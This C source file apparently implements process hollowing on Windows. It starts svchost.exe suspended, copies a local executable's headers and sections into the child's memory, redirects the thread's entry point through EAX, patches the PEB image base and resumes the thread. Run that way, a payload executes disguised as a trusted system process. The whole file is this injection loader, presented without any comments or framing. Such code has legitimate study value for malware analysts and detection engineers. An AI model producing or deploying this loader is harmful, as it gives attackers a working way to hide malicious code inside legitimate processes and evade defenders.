#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed (%d).\n", GetLastError());
	}


	HINSTANCE handleToRemoteNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;


	PROCESS_BASIC_INFORMATION pbi;
	PULONG returnLen = NULL;


	NtQueryInformationProcess(
		pi.hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		returnLen
	);

	// GET PEB Info
	PPEB peb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);

	//ZwUnmapViewOfSection(pi.hProcess, peb->ImageBaseAddress);


	HANDLE hFileYo = CreateFileA("C:\\Users\\pip\\Desktop\\yo3.exe", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE handleMappingYo = CreateFileMappingA(hFileYo, NULL, PAGE_READWRITE, 0, 0, NULL);
	LPVOID lpBaseYo = MapViewOfFile(handleMappingYo, FILE_MAP_ALL_ACCESS, 0, 0, 0);


	PIMAGE_DOS_HEADER dosHeaderYo = (PIMAGE_DOS_HEADER)lpBaseYo;

	if (dosHeaderYo->e_magic != IMAGE_DOS_SIGNATURE) 
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}
		
	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderYo + (DWORD)dosHeaderYo->e_lfanew);

	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];

	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders);


	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers: %i", GetLastError());
		return -1;
	}

	
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);

	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
	{
		BYTE* section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
		memcpy(section, (PVOID)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);

		printf("Copying data from: %s\n", sectionHeader->Name);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed: %i", GetLastError());
			return -1;
		}
		sectionHeader++;
	}
	

	PCONTEXT lpContext = new CONTEXT();
	lpContext->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, lpContext);
	lpContext->Eax = (DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;

	printf("EAX: %x\n", lpContext->Eax);
	SetThreadContext(
		pi.hThread,
		lpContext
	);

	WriteProcessMemory(
		pi.hProcess,
		(LPVOID)((DWORD)pbi.PebBaseAddress + 8),
		&pNTHeaderYo->OptionalHeader.ImageBase,
		4,
		NULL
	);

	ResumeThread(
		pi.hThread
	);


	printf("Created Process id: %i\n", pi.dwProcessId);
	printf("Size of Image: %u\n", pNTHeaderYo->OptionalHeader.SizeOfImage);
	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
	printf("Source Base Address %x\n", pNTHeaderYo->OptionalHeader.ImageBase);

	return 0;
}